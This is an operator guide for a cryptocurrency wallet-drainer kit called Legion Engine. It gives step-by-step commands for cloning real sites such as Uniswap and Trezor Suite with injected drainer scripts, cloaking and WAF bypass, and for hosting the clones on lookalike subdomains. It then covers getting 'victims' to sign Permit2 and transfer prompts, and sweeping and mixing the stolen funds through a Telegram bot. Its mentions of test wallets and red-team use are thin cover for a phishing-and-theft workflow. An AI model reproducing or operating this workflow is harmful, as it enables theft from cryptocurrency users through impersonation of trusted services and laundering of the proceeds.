# Legion Engine — Operator Guide (Windows / PowerShell)

Step-by-step guide to deploy a professional mirror clone, fund execution wallets, test the drainer backend, and run your first live drain.

---

## Prerequisites

Install and verify these before starting:

| Tool | Check command | Notes |
|------|---------------|-------|
| Node 20+ | `node -v` | Required by repo |
| pnpm 9+ | `pnpm -v` | `corepack enable pnpm` |
| Docker Desktop | `docker version` | Mirror nginx runs in Docker |
| cloudflared | `cloudflared --version` | [Install](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/) |
| Git repo deps | `pnpm install` | From repo root |

Optional (improves WAF bypass during clone generation):

- `curl-impersonate` / `curl_chrome120` on PATH — best JA3 mimicry on Windows

---

## Part 0 — One-time `.env` setup

1. Copy the template if you have not already:

```powershell
cd C:\Users\HP\Downloads\Legion\legion-engine
Copy-Item .env.example .env
```

2. Fill in these **minimum** groups in `.env`:

### Backend API (drainer)

```ini
BACKEND_URL=https://your-api.up.railway.app
# or local: BACKEND_URL=http://localhost:4000

DATABASE_URL=postgresql://...
REDIS_URL=redis://localhost:6379
SUPABASE_URL=...
SUPABASE_SERVICE_ROLE_KEY=...

SETTLEMENT_EXECUTION_PRIVATE_KEY=0x...   # EVM strike signer
SOVEREIGN_VAULT_EVM=0x...                # where drained EVM funds land first

SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY=... # base58 64-byte keypair
SOVEREIGN_VAULT_SOL=...

TRON_EXECUTION_PRIVATE_KEY=...
SOVEREIGN_VAULT_TRON=T...

TON_EXECUTION_MNEMONIC="word1 word2 ... word24"
SOVEREIGN_VAULT_TON=EQ...

BITCOIN_EXECUTION_WIF=...
SOVEREIGN_VAULT_BTC=bc1...

FINAL_WALLET_EVM=0x...
FINAL_WALLET_SOL=...
FINAL_WALLET_TRX=T...
FINAL_WALLET_TON=EQ...
FINAL_WALLET_BTC=bc1...
```

### Mirror / DNSHE (professional subdomain)

```ini
DNSHE_TOKEN=your_dnshe_api_token
DNSHE_BASE_DOMAIN=swapp.cc.cd
```

Get `DNSHE_TOKEN` from your DNSHE dashboard. `DNSHE_BASE_DOMAIN` is the zone you registered (e.g. `swapp.cc.cd`).

### Telegram ops

```ini
TELEGRAM_BOT_TOKEN=123456:ABC...
TELEGRAM_CHAT_IDS=your_numeric_chat_id
```

### Sepolia E2E test only

```ini
TEST_EVM_PRIVATE_KEY=0x...          # Sepolia burner wallet
TEST_EVM_VAULT=0x...                # defaults to SOVEREIGN_VAULT_EVM
RPC_SEPOLIA_PRIVATE=https://rpc.ankr.com/eth_sepolia
```

3. Start local infra (if not using Railway/Supabase cloud):

```powershell
docker compose up -d redis postgres
pnpm db:migrate
```

4. Build and run the API:

```powershell
pnpm --filter @legion/api build
pnpm --filter @legion/api dev
```

Expected: API listening on port `4000` (or your `PORT`).

5. Verify health:

```powershell
pnpm run health
```

---

## Part 1 — Generate a professional mirror clone

### 1.1 What `--god-mode` does

```powershell
pnpm clone-tunnel --god-mode https://app.uniswap.org
```

God-mode enables:

- Production clone (`--production-clone`, silent inject, cloaking, WAF bypass, asset rewrite)
- **DNSHE auto-subdomain** when `DNSHE_TOKEN` + `DNSHE_BASE_DOMAIN` are set
- `CLONE_JA3_CHROME=true` automatically (Chrome TLS fingerprint for scraping)

The orchestrator:

1. Generates clone into `clones/tunnel-<timestamp>/`
2. Runs `docker compose up` (nginx on `localhost:8080`)
3. Claims a DNSHE subdomain and starts `cloudflared`
4. Prints **only the public URL** to stdout (e.g. `https://app.swapp.cc.cd`)

Progress logs go to **stderr** (`[clone-tunnel] ...`).

### 1.2 DNSHE auto-provisioning (how it works)

When god-mode runs with DNSHE configured:

1. **Discover** subdomains from the target site:
   - Fetches the homepage HTML
   - Parses `href`, `src`, and CSS `url()` for same-domain hosts
   - DNS-probes common labels (`app`, `api`, `cdn`, `www`, …)
2. **Prioritize**: original URL subdomain first (`app` for `app.uniswap.org`), then discovered, then common list
3. **Claim** each candidate on DNSHE:
   ```
   GET https://api.dnshe.com/record/update
     ?hostname={label}.{DNSHE_BASE_DOMAIN}
     &token={DNSHE_TOKEN}
     &type=A&value=auto
   ```
   First label that succeeds (not "already exists") is used.
4. **Fallbacks** if all taken:
   - Site name label (`uniswap.swapp.cc.cd`)
   - Random suffix (`uniswap-3xk7.swapp.cc.cd`, up to 8 tries)
   - Quick tunnel `*.trycloudflare.com` + warning
5. **Wait 5 seconds** for DNS propagation
6. **Start tunnel**: `cloudflared tunnel --hostname {fqdn} --url http://localhost:8080`

### 1.3 Environment variables for cloning

| Variable | Purpose | God-mode default |
|----------|---------|------------------|
| `DNSHE_TOKEN` | DNSHE API token | Required for professional subdomain |
| `DNSHE_BASE_DOMAIN` | Your zone (`swapp.cc.cd`) | Required |
| `CLONE_JA3_CHROME` | Chrome JA3 TLS for WAF bypass fetch | `true` (set by god-mode) |
| `BACKEND_URL` | Injected into clone → API calls | From `.env` or Railway default |
| `MIRROR_WAF_BYPASS` | Proxy/captcha during generation | `true` in god-mode |

To **disable JA3** before a run (see troubleshooting), add to `.env`:

```ini
CLONE_JA3_CHROME=false
```

Or for a one-off run in PowerShell:

```powershell
$env:CLONE_JA3_CHROME = "false"
pnpm clone-tunnel --god-mode https://suite.trezor.io
```

God-mode respects `CLONE_JA3_CHROME=false` in `.env` or the shell environment.

### 1.4 Run clone (examples)

**Uniswap:**

```powershell
cd C:\Users\HP\Downloads\Legion\legion-engine
pnpm clone-tunnel --god-mode https://app.uniswap.org
```

**Trezor Suite:**

```powershell
pnpm clone-tunnel --god-mode https://suite.trezor.io
```

**Expected stderr (abbreviated):**

```
[clone-tunnel] God-mode: silent inject, cloaking, WAF bypass...
[CLONE_JA3] TLS transport: curl-impersonate (...)
[clone-tunnel] DNSHE discovery: 28 candidate(s) (origin: app)
[clone-tunnel] DNSHE claimed: app.swapp.cc.cd
```

**Expected stdout (only this line):**

```
https://app.swapp.cc.cd
```

Keep the terminal open — `cloudflared` runs detached in the background.

### 1.5 Verify clone locally

```powershell
curl http://127.0.0.1:8080/
```

Open the DNSHE URL in a browser. You should see the mirrored site with Legion inject scripts pointing at `BACKEND_URL`.

---

## Part 2 — JA3 error troubleshooting

### Symptom

During clone generation you see:

```
Generation failed: Cannot read properties of undefined (reading '...')
```

Often preceded by:

```
[CLONE_JA3] TLS transport: node-tls (...)
```

### Cause

`CLONE_JA3_CHROME=true` tries curl-impersonate → Node TLS mimic → fetch fallback. On Windows, `curl-impersonate` is often missing and the Node TLS path can fail on certain hosts.

### Workaround — disable JA3

Add to `.env` (or set in PowerShell for one run):

```ini
CLONE_JA3_CHROME=false
```

Re-run god-mode:

```powershell
pnpm clone-tunnel --god-mode https://suite.trezor.io
```

Clone generation will use plain `fetch` instead of JA3 TLS mimicry.

### Re-enable JA3 later

1. Install `curl-impersonate` (Windows build or WSL)
2. Verify: `curl_chrome120 --version`
3. Restore `CLONE_JA3_CHROME=true` in `mirror-god-mode.ts`
4. Re-run god-mode clone

### DNSHE fallback

If DNSHE fails (all subdomains taken, bad token, API down):

```
[clone-tunnel] DNSHE provisioning failed: ... — trying quick tunnel
[clone-tunnel] WARNING: falling back to trycloudflare.com quick tunnel
https://random-words.trycloudflare.com
```

**Fixes:**

- Check `DNSHE_TOKEN` and `DNSHE_BASE_DOMAIN` in `.env`
- Log into DNSHE dashboard — confirm zone is active
- Try a different `DNSHE_BASE_DOMAIN` zone
- Quick tunnel still works for testing; URL changes each run

---

## Part 3 — Fund execution wallets

Execution wallets **pay gas** for on-chain strikes. Vault wallets **receive** drained funds first. Final wallets receive swept profits.

### 3.1 Print your addresses

```powershell
pnpm exec tsx --env-file=.env scripts/print-execution-wallets.ts
```

Example output:

```
Legion wallet map (addresses only)

EVM execution          0xAbC...123
EVM vault              0xDeF...456
EVM final              0x789...abc
Solana execution       7xKX...
...
```

### 3.2 Minimum funding (mainnet production)

| Chain | Execution wallet env key | Suggested minimum | Faucet (testnet only) |
|-------|--------------------------|-------------------|------------------------|
| EVM | `SETTLEMENT_EXECUTION_PRIVATE_KEY` | **0.02–0.05 ETH** | Sepolia faucet for E2E |
| Solana | `SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY` | **0.1 SOL** | devnet faucet |
| Tron | `TRON_EXECUTION_PRIVATE_KEY` | **100–200 TRX** | Nile/Shasta |
| TON | `TON_EXECUTION_MNEMONIC` | **2–5 TON** | testnet faucet |
| Bitcoin | `BITCOIN_EXECUTION_WIF` | **0.0002 BTC** | testnet faucet |

Also fund **vault** addresses with a small amount of native gas so vault→final sweeps can execute.

### 3.3 Verify balances

```powershell
pnpm run live-audit
```

Look for:

```
✅ Execution wallet – EVM: 0.050000 ETH
✅ Vault gas – EVM: 0.020000 ETH
⚠️ Execution wallet – Solana: 0.001000 SOL < min 0.005   ← fund this
```

---

## Part 4 — Test drainer backend (Sepolia)

This tests the **API only** — no mirror UI required.

### 4.1 Prepare Sepolia burner

1. Create a fresh wallet or use a test key in `TEST_EVM_PRIVATE_KEY`
2. Fund it on Sepolia:
   - ETH: ≥ 0.01 ETH (gas + 0.001 native drain)
   - USDC: ≥ 1 USDC on Sepolia (`0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238`)
3. Ensure API has Sepolia RPC configured (`RPC_SEPOLIA_PRIVATE` or `RPC_ETHEREUM_PRIVATE` pointing to Sepolia for chain 11155111)

### 4.2 Run E2E drain test

```powershell
pnpm run test-drain
# same as:
pnpm exec tsx --env-file=.env scripts/e2e-test-drain.ts
```

### 4.3 Expected output

```
Legion E2E — Sepolia real drain
  backend: https://your-api.up.railway.app
  wallet:  0xBurner...
  vault:   0xVault...

✅ Health check
   HTTP 200, data.status=ok

✅ Fetch typed data
✅ Sign Permit2 batch
✅ Sign native ETH
✅ Submit signature-anchor
   HTTP 200 settlement=SETTLED tx=0x...

✅ Vault USDC increased
✅ Vault ETH increased

✅ E2E drain test PASSED
```

### 4.4 If it fails

| Error | Fix |
|-------|-----|
| `Missing required env: TEST_EVM_PRIVATE_KEY` | Set in `.env` |
| `Health check` failed | Start API / fix `BACKEND_URL` |
| `Pre-flight USDC` failed | Send Sepolia USDC to burner |
| `native_transfer missing` | Set `SOVEREIGN_VAULT_EVM` on API |
| `FAILED_SETTLEMENT` | Check API logs, execution wallet ETH on Sepolia |

---

## Part 5 — Real drain test via live clone

Use **your own test wallet** with small amounts only.

### 5.1 Pre-flight checklist

- [ ] Clone live: `https://app.swapp.cc.cd` (or your DNSHE URL)
- [ ] API running and healthy (`pnpm run health`)
- [ ] Execution wallets funded (`pnpm run live-audit`)
- [ ] `BACKEND_URL` in clone matches live API
- [ ] `API_CORS_ORIGINS` includes your mirror domain (or `API_CORS_ALLOW_ALL=1` for testing)
- [ ] Telegram bot running (API process with `TELEGRAM_BOT_TOKEN` set)

### 5.2 Share clone URL

Send the URL from step 1.4:

```
https://suite.swapp.cc.cd
```

### 5.3 Victim flow (your test wallet)

1. Open URL in browser (prefer clean profile / mobile)
2. Click **Connect Wallet** (MetaMask, Phantom, etc.)
3. Approve connection
4. Complete signature prompts (Permit2 / native transfer / chain-specific)
5. Wait 10–30 seconds for settlement

### 5.4 Verify fund movement

**On-chain:**

- Victim wallet balance decreases
- `SOVEREIGN_VAULT_*` balance increases

**API / DB:**

```powershell
# Telegram
/recent 5
/stats today
```

**Explorer:**

- EVM: Etherscan → vault address → incoming tx
- Solana: Solscan → `SOVEREIGN_VAULT_SOL`

Expected flow:

```
Victim wallet  →  Sovereign vault (SETTLED)  →  /sweep  →  FINAL_WALLET_*
```

### 5.5 Sweep to final wallet

In Telegram (authorized chat):

```
/sweep
```

Expected reply:

```
⏳ Running vault sweep…
✅ Sweep complete
EVM: 0.001 ETH → 0xFinal...
USDC: 1.00 → 0xFinal...
```

Or enable automatic sweeps in `.env`:

```ini
SWEEP_ENABLED=true
SWEEP_CRON=0 */6 * * *
```

---

## Part 6 — Telegram monitoring

### 6.1 Setup

1. Create bot via [@BotFather](https://t.me/BotFather) → copy token → `TELEGRAM_BOT_TOKEN`
2. Get your chat ID (message [@userinfobot](https://t.me/userinfobot)) → `TELEGRAM_CHAT_IDS`
3. Restart API

### 6.2 Commands

| Command | Action |
|---------|--------|
| `/start` | List all commands |
| `/status` | API health, queue depth, last settlement |
| `/pause` | Block new signature-anchor requests |
| `/resume` | Re-open ingress |
| `/recent 5` | Last 5 settled drains |
| `/stats today` | Today's count + USD total |
| `/sweep` | Move vault balances → `FINAL_WALLET_*` |
| `/mix` | Split-withdraw mixer (if `MIXING_ENABLED=true`) |
| `/clone https://...` | Deploy mirror from Telegram (needs Docker on bot host) |
| `/failed` | Dead-letter queue jobs |

### 6.3 Alerts you'll see

- New settlement notifications (when configured)
- Gas warnings (low execution wallet balance)
- Mirror deploy results from `/clone`
- Sweep / mix completion summaries

---

## Quick reference — full first drain workflow

```powershell
# 1. Setup
cd C:\Users\HP\Downloads\Legion\legion-engine
pnpm install
docker compose up -d redis postgres
pnpm --filter @legion/api build
pnpm --filter @legion/api dev   # separate terminal

# 2. Verify
pnpm run health
pnpm exec tsx --env-file=.env scripts/print-execution-wallets.ts
pnpm run live-audit

# 3. Fund execution wallets (send native gas to printed addresses)

# 4. Sepolia API test
pnpm run test-drain

# 5. Deploy mirror
pnpm clone-tunnel --god-mode https://app.uniswap.org
# copy stdout URL

# 6. Live test with your wallet on the clone URL

# 7. Monitor + sweep
# Telegram: /recent 5
# Telegram: /sweep
```

---

## Part 7 — 8-chain Surge drainer test (`legion-drainer-test.surge.sh`)

Standalone test page (no mirror/nginx). Use for authorized red-team validation before deploying clones.

### 7.1 Prerequisites

| Step | Command / action |
|------|------------------|
| Fund execution wallets | `pnpm wallet-guide` |
| Railway CORS | Add `https://legion-drainer-test.surge.sh` to `API_CORS_ORIGINS` |
| Extended-chain vaults | Set `VAULT_ADDRESS_COSMOS`, `VAULT_ADDRESS_APTOS`, `VAULT_ADDRESS_SUI` on Railway |
| Local Telegram conflict | `TELEGRAM_BOT_SKIP_LOCAL=true` in local `.env` |
| Verify Railway env | `pnpm check-railway` |
| Dry-run backend | `node scripts/test-legion-one-dryrun.mjs` |

Vault addresses are auto-loaded by the frontend from `GET /api/v1/client-config` (`vault_addresses`). You can override in `scripts/index.html` → `LEGION_CONFIG.vaultAddresses`.

### 7.2 Wallet extensions (install before testing)

| Chain | Extension | Install |
|-------|-----------|---------|
| EVM | MetaMask / Rabby | [metamask.io](https://metamask.io) / [rabby.io](https://rabby.io) |
| Solana | Phantom / Solflare | [phantom.app](https://phantom.app) |
| Tron | TronLink | [tronlink.org](https://www.tronlink.org) |
| TON | Tonkeeper | [tonkeeper.com](https://tonkeeper.com) |
| Bitcoin | UniSat / Xverse | [unisat.io](https://unisat.io) / [xverse.app](https://www.xverse.app) |
| Cosmos | Keplr | [keplr.app](https://www.keplr.app) |
| Aptos | Petra | [petra.app](https://petra.app) |
| Sui | Sui Wallet | [sui.io/wallet](https://sui.io/wallet) |

WalletConnect (EVM + Solana only): set `LEGION_CONFIG.wcProjectId` in `scripts/index.html`.

### 7.3 Deploy / update Surge page

```powershell
cd scripts
surge . legion-drainer-test.surge.sh
```

Open https://legion-drainer-test.surge.sh → click **⬡** (bottom-right) → select chain tab → **Connect & Drain**.

### 7.4 Per-chain test checklist

Use a **burner wallet with dust only**.

- [ ] **EVM** — Permit2 batch + optional native; MetaMask signs typed data
- [ ] **SOL** — Omnichain leg (EVM batch required); Phantom signs SOL tx
- [ ] **TRX** — TronLink unlocked; TRX native in batch
- [ ] **TON** — Tonkeeper popup; TON native in batch
- [ ] **BTC** — Funded UniSat/Xverse wallet (not empty vault); PSBT sign → anchor
- [ ] **ATOM** — Keplr + vault configured; MsgSend sign
- [ ] **APT** — Petra + vault configured; transfer sign
- [ ] **SUI** — Sui Wallet + vault configured; signTransactionBlock

### 7.5 Execution wallet minimums (fund before live drains)

Run `pnpm wallet-guide` for current addresses. Typical minimums:

| Chain | Minimum native |
|-------|----------------|
| EVM | 0.005 ETH |
| Solana | 0.05 SOL |
| Tron | 50 TRX |
| TON | 2 TON |
| Bitcoin | 0.00015 BTC |

### 7.6 Verify settlement

```powershell
node scripts/test-legion-one-dryrun.mjs
curl https://sadrailala-production.up.railway.app/telegram-status
```

Telegram: `/recent 5`, `/status`

---

## Troubleshooting cheat sheet

| Problem | Solution |
|---------|----------|
| JA3 `Cannot read properties of undefined` | Disable JA3 (Part 2); install curl-impersonate |
| DNSHE → trycloudflare fallback | Fix token/domain; check DNSHE dashboard |
| `docker compose up failed` | Start Docker Desktop; free port 8080 |
| `cloudflared` not found | Install cloudflared; add to PATH |
| Clone loads but no drain | Check `BACKEND_URL`, CORS, browser console |
| Settlement stuck PENDING | Fund execution wallet gas; check Redis |
| `/sweep` no-op | Set `FINAL_WALLET_*`; fund vault gas |
| CORS blocked | Add mirror or `https://legion-drainer-test.surge.sh` to `API_CORS_ORIGINS` |
| Circular JSON error | Fixed in `legion-one-script.js` — redeploy Surge; use `walletType` not provider object |
| Vault not configured (ATOM/APT/SUI) | Set `VAULT_ADDRESS_*` on Railway; reload page (client-config auto-load) |
| Extension not detected | Install wallet from Part 7.2 links; refresh page |
| BTC PSBT no UTXOs | Use funded burner wallet, not empty execution vault address |
| WalletConnect expired | Click WalletConnect again to reconnect |

---

*Last updated for DNSHE god-mode orchestrator + `scripts/print-execution-wallets.ts`.*
